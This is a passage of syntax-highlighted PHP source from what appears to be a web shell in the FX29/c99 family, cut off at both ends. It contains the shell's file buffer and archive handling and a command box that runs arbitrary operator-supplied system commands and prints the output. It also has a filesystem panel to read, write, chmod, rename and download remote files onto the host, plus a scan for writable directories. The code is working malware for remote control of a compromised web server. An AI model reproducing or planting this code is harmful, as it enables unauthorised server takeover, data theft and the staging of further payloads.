    <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">###[ CUT ]###</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;cut&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">],</span><span class="nv">$actbox</span><span class="p">);</span>
    <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
    <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">###[ UNSELECT ]###</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;unselect&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
    <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">###[ EMPTY BUFFER ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$actemptybuff</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span> <span class="p">}</span>
  <span class="c1">###[ PASTE BUFFER ]###</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="o">@</span><span class="nv">$actpastebuff</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$psterr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs_copy_obj</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$to</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t copy &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$copy_unset</span><span class="p">)</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs_move_obj</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$to</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t move &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$psterr</span><span class="p">))</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Pasting with errors:&amp;lt;br&amp;gt;</span><span class="si">$psterr</span><span class="s2">&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">###[ ARCHIVE BUFFER ]###</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="o">@</span><span class="nv">$actarcbuff</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$arcerr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$actarcbuff_path</span><span class="p">,</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$ext</span> <span class="o">=</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span> <span class="nv">$ext</span> <span class="o">=</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">==</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$cmdline</span> <span class="o">=</span> <span class="s2">&quot;tar cfzv&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="nv">$cmdline</span> <span class="o">.=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$actarcbuff_path</span><span class="p">;</span>
    <span class="nv">$objects</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">],</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$objects</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$v</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$v</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="o">==</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$v</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
        <span class="nv">$v</span> <span class="o">.=</span> <span class="s2">&quot;*&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="nv">$cmdline</span> <span class="o">.=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
    <span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="nv">$cmdline</span><span class="p">);</span>
    <span class="nb">chdir</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$arcerr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t call archivator (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nx">str2mini</span><span class="p">(</span><span class="nv">$cmdline</span><span class="p">,</span><span class="mi">60</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;)!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$copy_unset</span><span class="p">)</span> <span class="p">{</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span> <span class="p">}</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nx">fs_rmobj</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> <span class="p">}</span>
      <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$arcerr</span><span class="p">))</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Archivation errors:&amp;lt;br&amp;gt;</span><span class="si">$arcerr</span><span class="s2">&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">###[ CMD ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;cmd&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$chdir</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=barheader&amp;gt;.: Command Output :.&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="nv">$olddir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
      <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
      <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
      <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$cmd_txt</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nv">$rows</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span> <span class="p">}</span>
        <span class="nv">$cols</span> <span class="o">=</span> <span class="mi">125</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;textarea class=</span><span class="se">\&quot;</span><span class="s2">shell</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="si">$cols\</span><span class="s2">&quot;</span> <span class="nx">rows</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$rows\</span><span class="s2">&quot;</span> <span class="nx">readonly</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.htmlspecialchars(</span><span class="si">$ret</span><span class="s2">).&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">      }</span>
<span class="s2">      else { echo </span><span class="si">$ret</span><span class="s2">.&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;; }</span>
<span class="s2">      @chdir(</span><span class="si">$olddir</span><span class="s2">);</span>
<span class="s2">    }</span>
<span class="s2">  }</span>
<span class="s2">  ###[ PHP FILESYSTEM (By FaTaLisTiCz_Fx) ]###</span>
<span class="s2">  if (</span><span class="si">$act</span><span class="s2"> == &quot;</span><span class="nx">phpfsys</span><span class="s2">&quot;) {</span>
<span class="s2">    echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">div</span> <span class="nx">align</span><span class="o">=</span><span class="nx">left</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">    </span><span class="si">$fsfunc</span><span class="s2"> = </span><span class="si">$phpfsysfunc</span><span class="s2">;</span>
<span class="s2">    if (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nb">copy</span><span class="s2">&quot;) {</span>
<span class="s2">      if (!copy(</span><span class="si">$arg1</span><span class="s2">, </span><span class="si">$arg2</span><span class="s2">)) { echo &quot;</span><span class="nx">Failed</span> <span class="nx">to</span> <span class="nb">copy</span> <span class="nv">$arg1</span><span class="o">...</span><span class="nx">\n</span><span class="s2">&quot;;}</span>
<span class="s2">      else { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Success</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$arg1</span> <span class="nx">copied</span> <span class="nx">to</span> <span class="nv">$arg2\n</span><span class="s2">&quot;; }</span>
<span class="s2">    }</span>
<span class="s2">    elseif (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nb">rename</span><span class="s2">&quot;) {</span>
<span class="s2">      if (!rename(</span><span class="si">$arg1</span><span class="s2">, </span><span class="si">$arg2</span><span class="s2">)) { echo &quot;</span><span class="nx">Failed</span> <span class="nx">to</span> <span class="nb">rename</span><span class="o">/</span><span class="nx">move</span> <span class="nv">$arg1</span><span class="o">!</span><span class="nx">\n</span><span class="s2">&quot;;}</span>
<span class="s2">      else { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Success</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$arg1</span> <span class="nx">renamed</span><span class="o">/</span><span class="nx">moved</span> <span class="nx">to</span> <span class="nv">$arg2\n</span><span class="s2">&quot;; }</span>
<span class="s2">    }</span>
<span class="s2">    elseif (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nb">chmod</span><span class="s2">&quot;) {</span>
<span class="s2">      if (!chmod(</span><span class="si">$arg1</span><span class="s2">,</span><span class="si">$arg2</span><span class="s2">)) { echo &quot;</span><span class="nx">Failed</span> <span class="nx">to</span> <span class="nb">chmod</span> <span class="nv">$arg1</span><span class="o">!</span><span class="nx">\n</span><span class="s2">&quot;;}</span>
<span class="s2">      else { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Perm</span> <span class="k">for</span> <span class="nv">$arg1</span> <span class="nx">changed</span> <span class="nx">to</span> <span class="nv">$arg2</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;; }</span>
<span class="s2">    }</span>
<span class="s2">    elseif (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nx">read</span><span class="s2">&quot;) {</span>
<span class="s2">      </span><span class="si">$darg</span><span class="s2"> = </span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg1</span><span class="s2">;</span>
<span class="s2">      if (</span><span class="si">$hasil</span><span class="s2"> = @file_get_contents(</span><span class="si">$darg</span><span class="s2">)) {</span>
<span class="s2">        echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Filename</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;.</span><span class="si">$darg</span><span class="s2">.&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">textarea</span> <span class="nx">cols</span><span class="o">=</span><span class="mi">125</span> <span class="nx">rows</span><span class="o">=</span><span class="mi">30</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        echo htmlentities(</span><span class="si">$hasil</span><span class="s2">);</span>
<span class="s2">        echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">      }</span>
<span class="s2">      else { disp_error(&quot;</span><span class="nx">Couldn</span><span class="s1">&#39;t open $darg&quot;); }</span>
<span class="s1">    }</span>
<span class="s1">    elseif ($fsfunc==&quot;write&quot;) {</span>
<span class="s1">      $darg = $d.$arg1;</span>
<span class="s1">      if(@file_put_contents($darg,$arg2)) {</span>
<span class="s1">        echo &quot;&amp;lt;b&amp;gt;Saved!&amp;lt;/b&amp;gt; &quot;.$darg;</span>
<span class="s1">      }</span>
<span class="s1">      else { disp_error(&quot;Can&#39;</span><span class="nx">t</span> <span class="nx">write</span> <span class="nx">to</span> <span class="nv">$darg</span><span class="o">!</span><span class="s2">&quot;); }</span>
<span class="s2">    }</span>
<span class="s2">    elseif (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nx">downloadbin</span><span class="s2">&quot;) {</span>
<span class="s2">      </span><span class="si">$handle</span><span class="s2"> = fopen(</span><span class="si">$arg1</span><span class="s2">, &quot;</span><span class="nx">rb</span><span class="s2">&quot;);</span>
<span class="s2">      </span><span class="si">$contents</span><span class="s2"> = &#39;&#39;;</span>
<span class="s2">      while (!feof(</span><span class="si">$handle</span><span class="s2">)) {</span>
<span class="s2">        </span><span class="si">$contents</span><span class="s2"> .= fread(</span><span class="si">$handle</span><span class="s2">, 8192);</span>
<span class="s2">      }</span>
<span class="s2">      </span><span class="si">$r</span><span class="s2"> = @fopen(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">,&#39;w&#39;);</span>
<span class="s2">      if (fwrite(</span><span class="si">$r</span><span class="s2">,</span><span class="si">$contents</span><span class="s2">)) { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Success</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$arg1</span> <span class="nx">saved</span> <span class="nx">to</span> <span class="s2">&quot;.</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">.&quot;</span> <span class="p">(</span><span class="s2">&quot;.view_size(filesize(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">)).&quot;</span><span class="p">)</span><span class="s2">&quot;; }</span>
<span class="s2">      else { disp_error(&quot;</span><span class="nx">Can</span><span class="s1">&#39;t write to &quot;.$d.$arg2.&quot;!&quot;); }</span>
<span class="s1">      fclose($r);</span>
<span class="s1">      fclose($handle);</span>
<span class="s1">    }</span>
<span class="s1">    elseif ($fsfunc==&quot;download&quot;) {</span>
<span class="s1">      $text = implode(&#39;&#39;, file($arg1));</span>
<span class="s1">      if ($text) {</span>
<span class="s1">        $r = @fopen($d.$arg2,&#39;</span><span class="nx">w</span><span class="s1">&#39;);</span>
<span class="s1">        if (fwrite($r,$text)) { echo &quot;&amp;lt;b&amp;gt;Success!&amp;lt;/b&amp;gt; $arg1 saved to &quot;.$d.$arg2.&quot; (&quot;.view_size(filesize($d.$arg2)).&quot;)&quot;; }</span>
<span class="s1">        else { disp_error(&quot;Can&#39;</span><span class="nx">t</span> <span class="nx">write</span> <span class="nx">to</span> <span class="s2">&quot;.</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">.&quot;</span><span class="o">!</span><span class="s2">&quot;); }</span>
<span class="s2">        fclose(</span><span class="si">$r</span><span class="s2">);</span>
<span class="s2">      }</span>
<span class="s2">      else { disp_error(&quot;</span><span class="nx">Can</span><span class="s1">&#39;t download from $arg1!&quot;);}</span>
<span class="s1">    }</span>
<span class="s1">    elseif ($fsfunc==&#39;</span><span class="nb">mkdir</span><span class="s1">&#39;) {</span>
<span class="s1">      $thedir = $d.$arg1;</span>
<span class="s1">      if ($thedir != $d) {</span>
<span class="s1">        if (file_exists($thedir)) { echo &quot;&amp;lt;b&amp;gt;Already exists:&amp;lt;/b&amp;gt; &quot;.htmlspecialchars($thedir); }</span>
<span class="s1">        elseif (!mkdir($thedir)) { echo &quot;&amp;lt;b&amp;gt;Access denied:&amp;lt;/b&amp;gt; &quot;.htmlspecialchars($thedir); }</span>
<span class="s1">        else { echo &quot;&amp;lt;b&amp;gt;Dir created:&amp;lt;/b&amp;gt; &quot;.htmlspecialchars($thedir);}</span>
<span class="s1">      }</span>
<span class="s1">      else { echo &quot;Can&#39;</span><span class="nx">t</span> <span class="nx">create</span> <span class="nb">current</span> <span class="nb">dir</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$thedir</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;; }</span>
<span class="s2">    }</span>
<span class="s2">    elseif (</span><span class="si">$fsfunc</span><span class="s2">==&#39;fwritabledir&#39;) {</span>
<span class="s2">      function recurse_dir(</span><span class="si">$dir</span><span class="s2">,</span><span class="si">$max_dir</span><span class="s2">) {</span>
<span class="s2">        global </span><span class="si">$dir_count</span><span class="s2">;</span>
<span class="s2">        </span><span class="si">$dir_count</span><span class="s2">++;</span>
<span class="s2">        if( </span><span class="si">$cdir</span><span class="s2"> = dir(</span><span class="si">$dir</span><span class="s2">) ) {</span>
<span class="s2">          while( </span><span class="si">$entry</span><span class="s2"> = </span><span class="si">$cdir</span><span class="s2">-&amp;gt; read() ) {</span>
<span class="s2">            if( </span><span class="si">$entry</span><span class="s2"> != &#39;.&#39; &amp;&amp; </span><span class="si">$entry</span><span class="s2"> != &#39;..&#39; ) {</span>
<span class="s2">              if(is_dir(</span><span class="si">$dir</span><span class="s2">.</span><span class="si">$entry</span><span class="s2">) &amp;&amp; is_writable(</span><span class="si">$dir</span><span class="s2">.</span><span class="si">$entry</span><span class="s2">) ) {</span>
<span class="s2">               if (</span><span class="si">$dir_count</span><span class="s2"> &amp;gt; </span><span class="si">$max_dir</span><span class="s2">) { return; }</span>
